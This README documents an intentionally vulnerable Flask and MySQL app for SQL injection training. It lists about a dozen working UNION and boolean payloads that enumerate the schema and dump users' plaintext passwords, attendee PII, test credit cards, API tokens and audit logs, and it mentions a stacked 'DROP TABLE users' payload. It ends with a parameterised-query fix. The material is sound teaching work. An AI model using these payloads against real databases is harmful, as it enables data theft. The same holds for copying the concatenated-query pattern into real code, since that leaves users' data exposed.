# sqlinject

Minimal Flask + MySQL app that **intentionally demonstrates SQL injection** for
training purposes. The `/?id=<n>` route concatenates user input straight into a
SQL query — **do not copy this pattern into real code.**

## Run

```bash
docker compose up --build
```

- App: http://localhost:8088  (host port 8088 → container 8000)
- DB health: http://localhost:8088/health
- **Adminer** (DB UI): http://localhost:8089 — connection details are pre-filled,
  just click **Login** (server `db`, user/pass `app`/`app`, database `app`). The
  one-click login is wired up by `adminer/plugins-enabled/01-autologin.php`.

On startup the app waits for MySQL and, on a blank database, seeds once
(idempotent — skips if rows already exist):

- **11 events** — 8 public + 3 private
- **50 users** — each with `email`, `phone`, and a **plaintext `password`**
  (48 use top-20 breach passwords; users 7 & 23 have strong unique ones)
- **~95 attendee links** — many-to-many between events and users
- **hidden tables** — `credit_cards`, `api_keys`, `audit_log` (15 cards, 6 keys, 30 log rows)

## Data model

```
events(id, title, venue, city, event_date, category, price, description, is_private)
users(id, first_name, last_name, email, phone, password)
attendees(event_id, user_id)

-- never referenced anywhere in the UI; only discoverable + leakable via SQLi:
credit_cards(id, user_id, cardholder_name, card_number, cvv, expiry)
api_keys(id, owner, token, scope, created_at)
audit_log(id, user_id, action, ip_address, user_agent, created_at)
```

## The vulnerability

```python
# app.py — index()
query = "SELECT * FROM events WHERE id = " + event_id   # ⚠️ user input concatenated
cur.execute(query)
```

- `/` (listing) filters `WHERE is_private = 0`, so private events are hidden.
- The `/?id=` detail query has **no** `is_private` filter and **no** input
  escaping — that asymmetry is the whole exploit.
- The executed SQL is printed on the page so the injection is always visible.
- Attendees are shown in the UI as `FirstName L.` only — full PII (email, phone,
  password) is never displayed by the intended app, but can be exfiltrated.

> Note on `is_private`: the filter is *deliberately* kept off the detail query.
> Adding `AND is_private = 0` would not actually help — `id=1 OR 1=1 AND is_private=0`
> binds as `id=1 OR (1=1 AND is_private=0)` (AND before OR), so private rows still leak.

## SQL injection examples

All payloads go in the `id` query parameter. In a browser, paste them after
`http://localhost:8088/?id=`. With `curl`, let it URL-encode for you:

```bash
curl -s -G http://localhost:8088/ --data-urlencode "id=<PAYLOAD>"
```

The MySQL comment `-- -` (dash-dash-space-dash) truncates the rest of the query.
The `events` table has **9 columns**, so every `UNION SELECT` must return 9 values
— map sensitive data into the text columns (`title`, `venue`, `city`, `description`).

### 1. Logic bypass — return every row

```
1 OR 1=1
```
`WHERE id = 1 OR 1=1` is always true → dumps all events (including the 3 **private**
ones that the listing hides).

### 2. Always-false base for clean UNION output

```
0 OR 1=1
-1
```
`id = -1` (or `0`) matches no real event, so only the injected `UNION` rows render.

### 3. Discover the column count

```
0 ORDER BY 9      -- works
0 ORDER BY 10     -- errors: "Unknown column '10' in 'order clause'"  → 9 columns
```
Or probe with explicit NULLs:
```
0 UNION SELECT 1,2,3,4,5,6,7,8,9-- -
```

### 4. Leak DB metadata (version / user / schema)

```
0 UNION SELECT 1, version(), current_user(), database(), '2000-01-01', 'LEAK', 0, 'db metadata', 1-- -
```
Shows the MySQL version, the connected user (`app@%`) and current schema (`app`).

### 5. Enumerate tables in the database

```
0 UNION SELECT 1, table_name, 'table', database(), '2000-01-01', 'SCHEMA', 0, 'table name', 1 FROM information_schema.tables WHERE table_schema = database()-- -
```
Reveals `events`, `users`, `attendees`.

### 6. Enumerate columns of a table

```
0 UNION SELECT 1, column_name, data_type, 'users', '2000-01-01', 'SCHEMA', 0, 'column', 1 FROM information_schema.columns WHERE table_name = 'users'-- -
```
Reveals `id, first_name, last_name, email, phone, password`.

### 7. Dump ALL users (email + phone + plaintext password)

```
0 UNION SELECT id, email, phone, password, '2000-01-01', 'LEAK', 0, CONCAT(first_name,' ',last_name), 1 FROM users-- -
```
Each of the 50 users renders as a card: `email` → title, `phone` → venue,
`password` → city. Full credential dump.

### 8. Leak the attendee PII of a specific (even private) event

The VIP Investor Dinner is event id **9** (private — hidden from the listing):

```
0 UNION SELECT u.id, u.email, u.phone, u.password, '2000-01-01', 'LEAK', 0, CONCAT(u.first_name,' ',u.last_name), 1 FROM users u JOIN attendees a ON a.user_id = u.id WHERE a.event_id = 9-- -
```
Joins `attendees` → `users` and exfiltrates the full PII of everyone attending —
the data the intended UI deliberately reduces to `FirstName L.`.

### 9. Leak the hidden `credit_cards` table

This table is **never referenced by the app** — you only find it via example 5,
then dump it:
```
0 UNION SELECT id, cardholder_name, card_number, cvv, '2000-01-01', expiry, 0, CONCAT('user ',user_id), 1 FROM credit_cards-- -
```
Card number → title, CVV → venue, expiry → category. (Test card data, not real.)

### 10. Leak the hidden `api_keys` table

```
0 UNION SELECT id, owner, token, scope, '2000-01-01', 'KEY', 0, 'api key', 1 FROM api_keys-- -
```
Exfiltrates live-looking service tokens (`demo_live_...`) and their scopes.

### 11. Leak the hidden `audit_log` table

```
0 UNION SELECT id, action, ip_address, user_agent, '2000-01-01', 'LOG', 0, CONCAT('user ',user_id), 1 FROM audit_log-- -
```
Exposes who did what, from which internal IP, with which client.

### 12. Direct private-event access (IDOR, not injection)

```
/?id=9
```
The detail query has no privacy check at all, so a plain id reaches a private
event without any injection — a second weakness layered on top of the SQLi.

> **Stacked queries** (e.g. `1; DROP TABLE users-- -`) do **not** work here:
> PyMySQL's `execute()` sends a single statement, so destructive multi-statement
> payloads are blocked by the driver — the leaks above are all read-only `UNION`/boolean attacks.

## How to fix it (the point of the demo)

```python
cur.execute("SELECT * FROM events WHERE id = %s AND is_private = 0", (event_id,))
```
Parameterised queries send data and code separately, so input can never change the
query structure. Combine with least-privilege DB users and never store plaintext
passwords.

## Local dev (without Docker)

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
DB_HOST=127.0.0.1 python app.py   # needs a MySQL on 3306
```
